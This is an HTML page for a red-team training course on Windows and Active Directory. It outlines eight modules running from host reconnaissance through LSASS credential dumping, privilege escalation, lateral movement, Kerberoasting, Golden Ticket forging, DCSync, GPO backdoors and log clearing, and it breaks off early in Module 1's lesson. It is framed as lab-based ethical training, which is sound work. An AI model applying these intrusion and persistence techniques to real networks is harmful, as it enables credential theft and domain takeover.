<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRTO_phase2</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body>
    <div class="container">
        
        <p><a href="../index.html">‚Üê Back to Course Catalog</a></p>

        <!-- Header Area -->
        <div class="course-header">
             <span class="category-tag">Category Placeholder</span> <!-- Add category data if available -->
            <h1>CRTO_phase2</h1>
            <p class="course-description">Description placeholder based on folder name</p> <!-- Add description data if available -->
            <div class="course-stats">
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock h-5 w-5 mr-2 text-primary"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Duration Placeholder</span> <!-- Add duration data if available -->
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-layers h-5 w-5 mr-2 text-primary"><path d="m12 18-6-6-4 4 10 10 10-10-4-4-6 6"/><path d="m12 18v4"/><path d="m2 12 10 10"/><path d="M12 18 22 8"/><path d="M6 6 10 2l10 10"/></svg> 8 Modules</span>
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-zap h-5 w-5 mr-2 text-primary"><path d="M13 2v10h6l-7 10v-10H5z"/></svg> Difficulty Placeholder</span> <!-- Add difficulty data if available -->
            </div>
            <button>Start Learning</button>
        </div>

        <!-- Course Body: Tabs Navigation -->
        <!-- Added relative positioning to tabs-nav for potential dropdown positioning -->
        <div class="course-tabs-nav" style="position: relative;">
             <!-- Links use data attributes for JS handling and #hashes for history -->
             <a href="#overview" class="tab-link active" data-view="overview">Overview</a>
             <!-- Course Content tab now acts as a dropdown toggle -->
             <a href="#course-content" class="tab-link" data-view="course-content-toggle">Course Content</a>
             <a href="#discussion" class="tab-link disabled" data-view="discussion">Discussion (Static)</a>
        </div>
        <!-- The dropdown menu will be dynamically created and appended near the tabs nav -->


        <!-- Course Body: Content Area (Two-Column Layout) -->
        <!-- This grid structure is always present on course pages -->
        <div class="course-body-grid">
            <div class="main-content-column">
                 <!-- Content will be loaded here by JS -->
                 <!-- Initial content is Overview (handled by JS on load) -->
                 <!-- The 'card main-content-card' is now part of the fragment HTML itself -->
            </div>
            <div class="sidebar-column">
                 <!-- Sidebar content (only for overview) will be loaded here by JS -->
            </div>
        </div>

         <!-- Hidden container for content fragments and data -->
         <!-- Store fragments and raw data as JSON string for easier parsing in JS -->
        <script id="course-fragments" type="application/json">
        {
  "overview": "\n        <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n            <h2>About This Course</h2>\n            <div class=\"markdown-content\">\n                <p>Okay, fellow knowledge seekers! Let&#39;s craft a comprehensive course outline that takes us from a simple foothold on a Windows machine all the way to owning the entire Active Directory domain. We&#39;ll break down the complex into the manageable, focusing on hands-on application and the &quot;why&quot; behind the &quot;how.&quot;</p>\n<p>This course is designed to be a deep dive, building practical skills for anyone looking to understand the offensive side of Windows and Active Directory security. We&#39;ll learn by doing, step-by-step, culminating in a full simulation.</p>\n<hr>\n<p><strong>Course Title:</strong> Windows &amp; Active Directory Red Teaming: Initial Access to Domain Dominance</p>\n<p><strong>Overall Course Objective:</strong> By the end of this course, learners will be able to plan, execute, and document a simulated Windows and Active Directory red team operation, effectively replicating the process from initial access context through post-exploitation, lateral movement, and achieving domain dominance objectives in a lab environment.</p>\n<p><strong>Target Audience:</strong> Learners with basic understanding of networking, operating systems (Windows fundamentals), and security concepts. Some prior exposure to command lines (CMD/PowerShell) is beneficial but not strictly required.</p>\n<p><strong>Course Structure:</strong> 8 Modules, progressively building skills and knowledge. Each module includes theory, practical techniques, resources, and a hands-on exercise contributing to the final Capstone Project.</p>\n<hr>\n<p><strong>Module 1: Post-Exploitation Foundations &amp; Initial Host Reconnaissance</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Understand the red team lifecycle&#39;s post-exploitation phase and perform comprehensive initial reconnaissance on a compromised Windows host using native tools and fundamental techniques.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Revisiting the Red Team/Attack Kill Chain (focus on Actions on Objective).</li>\n<li>Understanding the post-exploitation mindset and goals.</li>\n<li>Establishing and maintaining a stable foothold (briefly, assumes initial access is achieved).</li>\n<li>Essential Windows command-line interface (CMD) and PowerShell usage for reconnaissance.</li>\n<li>Gathering system information (<code>systeminfo</code>, registry queries).</li>\n<li>Enumerating users, groups, and sessions (<code>whoami</code>, <code>query user</code>, <code>net user</code>, <code>net localgroup</code>).</li>\n<li>Identifying running processes and services (<code>tasklist</code>, <code>Get-Process</code>, <code>Get-Service</code>).</li>\n<li>Mapping network connections and configuration (<code>ipconfig</code>, <code>netstat</code>, <code>Get-NetIPConfiguration</code>).</li>\n<li>Locating potential data of interest (recent files, browser history, known sensitive locations).</li>\n<li>Basic OpSec considerations for initial host interaction (minimizing noise).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Basic understanding of Windows operating system structure.</li>\n<li>Familiarity with command-line interfaces (CMD, PowerShell).</li>\n<li>Access to a lab environment with at least one target Windows machine (ideally domain-joined later).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Connect to a pre-configured target Windows VM (simulating initial access via RDP, shell, etc.) and perform a thorough initial host reconnaissance using only native Windows commands and PowerShell. Document all gathered information (OS version, users, groups, network config, running processes).</li>\n</ul>\n<hr>\n<p><strong>Module 2: Local Enumeration &amp; Credential Harvesting</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Identify valuable local information, uncover potential weaknesses, and extract cached or stored credentials from a compromised Windows host.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>In-depth local file system enumeration (identifying sensitive directories, configuration files, scripts, user profiles).</li>\n<li>Enumerating installed software and patches (<code>Get-WmiObject -Class Win32_Product</code>, <code>Get-HotFix</code>).</li>\n<li>Understanding Windows credential storage locations (LSASS, Registry Hives, Credential Manager).</li>\n<li>Techniques for dumping LSASS process memory (e.g., using <code>procdump</code> for offline analysis, understanding tools like Mimikatz - <em>focus on concept and usage, not tool development</em>).</li>\n<li>Extracting credentials and hashes from SAM and SECURITY registry hives.</li>\n<li>Identifying and leveraging misconfigurations (<code>AlwaysInstallElevated</code>, weak service permissions - <em>briefly, deep dive in M3</em>).</li>\n<li>Utilizing common post-exploitation scripts and tools for automated enumeration and harvesting (e.g., PowerSploit modules like <code>PowerView</code> for host recon, <code>Invoke-Mimikatz</code>).</li>\n<li>Case Study: Analyzing a real-world breach that heavily relied on credential harvesting.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Understanding of Windows registry structure.</li>\n<li>Basic knowledge of Windows security identifiers (SIDs).</li>\n<li>Access to a lab environment with administrative rights on the target VM (even if temporary).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Using the target VM from Module 1 (potentially reset), attempt to extract credentials from LSASS and registry hives. Use automated scripts/tools to enumerate potential sensitive files or misconfigurations. Document all harvested credentials and identified local weaknesses.</li>\n</ul>\n<hr>\n<p><strong>Module 3: Windows Privilege Escalation</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Identify and exploit common Windows misconfigurations, vulnerabilities, and features to elevate privileges from a standard user to Administrator or SYSTEM on a local host.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Understanding Windows integrity levels and User Account Control (UAC).</li>\n<li>Common UAC bypass techniques and their limitations.</li>\n<li>Exploiting vulnerable services (unquoted service paths, weak service permissions, insecure service binaries).</li>\n<li>Token manipulation and impersonation (<code>Incognito</code> module in Mimikatz, understanding <code>SeImpersonatePrivilege</code>).</li>\n<li>Exploiting insecure file and registry permissions.</li>\n<li>Leveraging auto-logon credentials or saved RDP credentials.</li>\n<li>Kernel exploits (overview of common types and how they are used in PE).</li>\n<li>Using automated PE tools like <code>PowerUp</code>, <code>WinPEAS</code>, <code>Sherlock</code>.</li>\n<li>Case Study: Analyzing specific PE techniques used in known malware or APT campaigns.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Understanding of Windows services and their configuration.</li>\n<li>Knowledge of Windows file system and registry permissions (ACLs).</li>\n<li>Lab environment where you can revert VM snapshots to practice different PE vectors.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> On the target VM, start with a low-privileged user account. Use enumeration techniques from previous modules and PE tools to identify at least two different privilege escalation vectors. Successfully exploit one vector to gain Administrator or SYSTEM privileges. Document the identified vectors and the successful exploitation path.</li>\n</ul>\n<hr>\n<p><strong>Module 4: Lateral Movement Techniques</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Master various techniques to move from a compromised host to other systems within the network using harvested credentials, session reuse, and native tools.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Understanding network topology and trust relationships within a Windows domain.</li>\n<li>Leveraging harvested credentials for lateral movement (introduction to Pass-the-Hash, Overpass-the-Hash - <em>deep dive in M6</em>).</li>\n<li>Lateral movement using native Windows tools:<ul>\n<li>PsExec and its variants (Sysinternals PsExec, Covenant&#39;s PsExec task).</li>\n<li>Windows Management Instrumentation (WMI) via <code>wmiexec.py</code>, <code>Invoke-WmiMethod</code>.</li>\n<li>Remote Desktop Protocol (RDP) with stolen or brute-forced credentials.</li>\n<li>PowerShell Remoting (<code>Invoke-Command</code>, <code>Enter-PSSession</code>).</li>\n</ul>\n</li>\n<li>Session reuse and leveraging existing authenticated sessions.</li>\n<li>Pivoting and tunneling through compromised hosts to reach isolated networks.</li>\n<li>OpSec considerations for lateral movement (network traffic analysis, endpoint detection).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Basic understanding of TCP/IP networking and common ports (135, 139, 445, 5985, 3389).</li>\n<li>Familiarity with Windows authentication basics (NTLM, Kerberos - <em>basic level</em>).</li>\n<li>Lab environment with multiple interconnected Windows machines (domain-joined).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Using credentials harvested or obtained through PE in previous modules, attempt to move laterally to at least two other hosts in the lab environment using different techniques (e.g., PsExec to one, WMI to another). Document the techniques used and proof of access on the new hosts.</li>\n</ul>\n<hr>\n<p><strong>Module 5: Active Directory Enumeration &amp; Attack Path Mapping</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Conduct comprehensive reconnaissance of an Active Directory environment to identify users, groups, computers, trusts, GPOs, and map potential attack paths to high-value targets like Domain Admins.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Introduction to Active Directory concepts (Domain Controllers, Forests, Trusts, OUs, GPOs).</li>\n<li>Using native command-line tools for AD enumeration (<code>net group /domain</code>, <code>net user /domain</code>, <code>nltest</code>, <code>dsquery</code>, <code>dsget</code>).</li>\n<li>Advanced AD enumeration with PowerShell (<code>ActiveDirectory</code> module, <code>PowerView</code> from PowerSploit).</li>\n<li>Enumerating domain trusts and their implications.</li>\n<li>Identifying sensitive groups and users (Domain Admins, Enterprise Admins, Backup Operators, etc.).</li>\n<li>Gathering information about Group Policy Objects (GPOs) and their application.</li>\n<li>Introduction to BloodHound for visualizing and identifying attack paths.</li>\n<li>Setting up and using BloodHound collectors (SharpHound, PowerHound).</li>\n<li>Loading data into Neo4j and querying BloodHound for common attack paths (Shortest path to Domain Admin, Kerberoastable users, AS-REP roastable users, Unconstrained Delegation).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Solid understanding of Active Directory structure and concepts.</li>\n<li>Basic understanding of graph databases (Neo4j).</li>\n<li>Lab environment with a functional Active Directory domain.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> From a domain-joined host (compromised in previous modules), perform extensive AD enumeration using PowerView or native tools. Run a BloodHound collector, import the data into Neo4j, and generate queries to identify potential attack paths leading to Domain Admin. Document key findings and identified paths.</li>\n</ul>\n<hr>\n<p><strong>Module 6: Advanced Credential Attacks</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Deepen understanding of NTLM and Kerberos authentication and execute sophisticated credential-based attacks to obtain hashes, tickets, and gain access to resources.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>In-depth look at NTLM authentication (challenges, responses, hash formats).</li>\n<li>Pass-the-Hash (PtH) techniques and tools (using NTLM hashes directly for authentication).</li>\n<li>Understanding Kerberos authentication (TGT, TGS, SPNs).</li>\n<li>Pass-the-Ticket (PtT) techniques (using Kerberos tickets for authentication).</li>\n<li>Overpass-the-Hash (PtT using NTLM hash to request a TGT).</li>\n<li>Kerberoasting: Identifying Service Principal Names (SPNs), requesting service tickets, and offline cracking of the encrypted ticket portion.</li>\n<li>AS-REP Roasting: Identifying users with &#39;Do not require Kerberos preauthentication&#39; and requesting their initial authentication hash.</li>\n<li>Leveraging tools like Mimikatz, Rubeus, Impacket (e.g., <code>getTGT.py</code>, <code>getST.py</code>, <code>GetUserSPNs.py</code>).</li>\n<li>Defenses and detection methods for these attacks.</li>\n<li>Case Study: How Kerberoasting was used in major breaches.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Good understanding of NTLM and Kerberos authentication flows.</li>\n<li>Familiarity with password cracking tools like Hashcat or John the Ripper.</li>\n<li>Access to tools like Mimikatz, Rubeus, and Impacket.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Using the enumerated AD data and potentially harvested credentials, attempt a Kerberoasting attack to obtain crackable hashes. If successful, attempt to crack the hashes. Attempt a Pass-the-Hash or Overpass-the-Hash attack against another host or service using previously obtained credentials/hashes. Document the attacks and results.</li>\n</ul>\n<hr>\n<p><strong>Module 7: Domain Dominance &amp; Persistence</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Achieve Domain Administrator privileges (or equivalent control) and establish persistent access within the Active Directory environment using advanced techniques.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Leveraging identified attack paths (from BloodHound) to compromise Domain Admins or high-privilege accounts.</li>\n<li>Golden Ticket attacks: Forging a Kerberos Ticket Granting Ticket (TGT) for any user in the domain, allowing impersonation of any user, including Enterprise Admins.</li>\n<li>Silver Ticket attacks: Forging a Kerberos Ticket Granting Service (TGS) for a specific service, allowing access to that service on a specific server.</li>\n<li>SIDHistory exploitation for privilege escalation across trusts.</li>\n<li>Domain Persistence Techniques:<ul>\n<li>DCSync: Simulating a Domain Controller to request password hashes for any user.</li>\n<li>DCShadow: Injecting malicious changes into Active Directory (creating users, modifying group memberships).</li>\n<li>Modifying Group Policy Objects (GPOs) for backdoor creation (startup scripts, scheduled tasks).</li>\n<li>AdminSDHolder and protected groups manipulation.</li>\n<li>Skeleton Key (patching LSASS on DCs).</li>\n<li>Shadow Credentials (abusing certificate services or adding alternative credentials).</li>\n</ul>\n</li>\n<li>OpSec considerations for domain-level actions (detection by monitoring domain events, Sysmon, etc.).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Deep understanding of Active Directory replication and authentication mechanisms.</li>\n<li>Familiarity with the structure of Kerberos tickets.</li>\n<li>Access to tools like Mimikatz, Rubeus, DSInternals, Impacket&#39;s <code>secretsdump.py</code>, <code>dcsync.py</code>.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Assuming Domain Admin access (potentially by resetting the lab or using a provided credential for this exercise), execute at least one Golden Ticket attack and one Silver Ticket attack to access resources. Implement at least two different domain persistence methods (e.g., DCSync hashes for a critical account, create a persistent GPO backdoor). Document the techniques used and verify persistence.</li>\n</ul>\n<hr>\n<p><strong>Module 8: Operational Security (OpSec), Reporting &amp; Capstone Project</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Understand and apply OpSec principles throughout the operation, synthesize all learned techniques, plan a simulated red team engagement, execute it in the lab, and document the process and findings.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Review of OpSec considerations at each stage of the operation (recon, PE, lateral movement, persistence).</li>\n<li>Common detection mechanisms (endpoint security, network monitoring, logging, SIEM rules).</li>\n<li>Techniques for evading detection (process injection, obfuscation, timing, careful tool usage).</li>\n<li>Understanding logging sources (Windows Event Logs, Sysmon, domain controller logs) and basic log tampering/clearing.</li>\n<li>Tradecraft and maintaining stealth.</li>\n<li>Planning a Red Team Operation: Defining objectives, scope, rules of engagement (in a lab context), intelligence gathering, strategy development.</li>\n<li>Documentation and Reporting: Creating clear, actionable reports for different audiences (executive summary, technical findings, recommendations).</li>\n<li><strong>Capstone Project:</strong> Planning and executing a simulated end-to-end red team operation in the lab environment, integrating techniques from all previous modules to achieve a specific objective (e.g., obtain Domain Admin, access a specific sensitive file share from initial low-priv access).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Review of all tools, techniques, and concepts from Modules 1-7.</li>\n<li>Understanding of basic incident response and detection principles.</li>\n<li>A fully configured lab environment mimicking a small enterprise network with AD.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> The Capstone Project.<ul>\n<li><strong>Phase 1: Planning:</strong> Define a specific objective for your mini-red team op in the lab (e.g., &quot;Access the HR file share located on the Domain Controller&quot;). Map out the likely attack path based on your AD enumeration from Module 5. Select the specific techniques you will use for PE, lateral movement, credential attacks, etc.</li>\n<li><strong>Phase 2: Execution:</strong> Start from a low-privileged initial access point in the lab. Execute your planned operation step-by-step, adapting as needed based on your findings. Document <em>everything</em> you do, the tools you use, the commands you run, any errors encountered, and the results at each stage.</li>\n<li><strong>Phase 3: Post-Operation:</strong> Clean up any persistence mechanisms or artifacts (in a real engagement, this would be critical, in a lab, it&#39;s good practice).</li>\n<li><strong>Phase 4: Reporting:</strong> Compile your documentation into a structured report. Include the objective, the steps taken, the techniques used, the findings (e.g., harvested credentials, accessed data), and how the objective was achieved. Reflect on OpSec considerations during your operation.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p>This outline provides a solid framework. Remember, the real learning comes from the hands-on lab work. Building and tearing down the lab environment, practicing techniques until they become second nature, and troubleshooting issues are just as important as understanding the theory. Good luck, and happy hunting (ethically, in your lab)!</p>\n\n            </div>\n            <h2 class=\"module-list-heading\">Course Content</h2> <!-- Add heading for module list -->\n            <ul class=\"module-list\">\n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-1\" data-view=\"module-1\" data-module-order=\"1\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 1: module_1</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_1 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-2\" data-view=\"module-2\" data-module-order=\"2\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 2: module_2</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_2 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-3\" data-view=\"module-3\" data-module-order=\"3\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 3: module_3</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_3 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-4\" data-view=\"module-4\" data-module-order=\"4\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 4: module_4</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_4 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-5\" data-view=\"module-5\" data-module-order=\"5\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 5: module_5</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_5 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-6\" data-view=\"module-6\" data-module-order=\"6\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 6: module_6</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_6 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-7\" data-view=\"module-7\" data-module-order=\"7\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 7: module_7</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_7 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-8\" data-view=\"module-8\" data-module-order=\"8\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 8: module_8</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_8 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        </ul> <!-- Include the module list for Overview -->\n        </div>\n    ",
  "modules": {
    "module-1": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 1: module_1</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, let&#39;s kick this off! I&#39;m genuinely stoked to guide you through the fascinating world of Windows and Active Directory red teaming. Forget dry lectures; we&#39;re here to build practical skills, understand the attacker&#39;s perspective, and frankly, have some fun breaking things in a controlled, ethical environment.</p>\n<p>This first module is our foundational step. Think of it like landing on a new planet ‚Äì you&#39;ve arrived (initial access achieved!), but you have <em>no idea</em> what&#39;s around you. Your immediate goal isn&#39;t to conquer the planet, but to figure out: Where are you? What resources are available? Who else is here? What&#39;s the lay of the land?</p>\n<p>That&#39;s exactly what initial host reconnaissance is about. We&#39;ll focus on using the tools <em>already present</em> on the system. Why? Because they&#39;re expected, often less noisy than dropping custom binaries, and surprisingly powerful once you know how to wield them.</p>\n<p>Let&#39;s dive in!</p>\n<hr>\n<h2><strong>Module 1: Post-Exploitation Foundations &amp; Initial Host Reconnaissance</strong></h2>\n<p><strong>Module Objective:</strong> Understand the red team lifecycle&#39;s post-exploitation phase and perform comprehensive initial reconnaissance on a compromised Windows host using native tools and fundamental techniques.</p>\n<p><strong>Alright, so you&#39;ve got a shell... now what?</strong></p>\n<p>This module assumes you&#39;ve already gained some form of initial access to a Windows machine. This could be anything from an RDP session with stolen credentials, a web shell on a vulnerable application, successful exploitation leading to a reverse shell, or even physical access (though less common in pure &quot;red team&quot; simulations unless specified).</p>\n<p>The <em>point</em> is, you are <em>on</em> the system, but likely with limited knowledge of your surroundings. This is where the &quot;Post-Exploitation&quot; phase begins.</p>\n<h3><strong>1.1 Revisiting the Red Team/Attack Kill Chain (Focus on Actions on Objective)</strong></h3>\n<p>You&#39;ve probably seen variations of the cyber kill chain or attack lifecycle. They generally follow a path:</p>\n<ol>\n<li><strong>Reconnaissance:</strong> Gathering information about the target <em>before</em> interacting with it.</li>\n<li><strong>Weaponization:</strong> Pairing an exploit with a backdoor/payload.</li>\n<li><strong>Delivery:</strong> Getting the weaponized payload to the target (phishing, vulnerable service, etc.).</li>\n<li><strong>Exploitation:</strong> Triggering the vulnerability to run your code.</li>\n<li><strong>Installation:</strong> Establishing a persistent foothold.</li>\n<li><strong>Command and Control (C2):</strong> Communicating with your implanted code.</li>\n<li><strong>Actions on Objective:</strong> <em>This is where we are right now.</em> This is the phase where the attacker performs actions to achieve their <em>actual goal</em> ‚Äì whether it&#39;s data exfiltration, disruption, gaining domain admin, or something else entirely.</li>\n</ol>\n<p>Post-exploitation <em>starts</em> after successful exploitation and often overlaps heavily with Installation, C2, and especially <strong>Actions on Objective</strong>. Our focus in this module is the <em>very first step</em> within Actions on Objective on a new host: <strong>understanding the host itself</strong>.</p>\n<h3><strong>1.2 Understanding the Post-Exploitation Mindset and Goals</strong></h3>\n<p>You&#39;ve got a shell. Great! But what can you <em>do</em> from here? Your immediate goals on this initial host are typically:</p>\n<ul>\n<li><strong>Confirm your access level:</strong> Are you a standard user, an administrator, 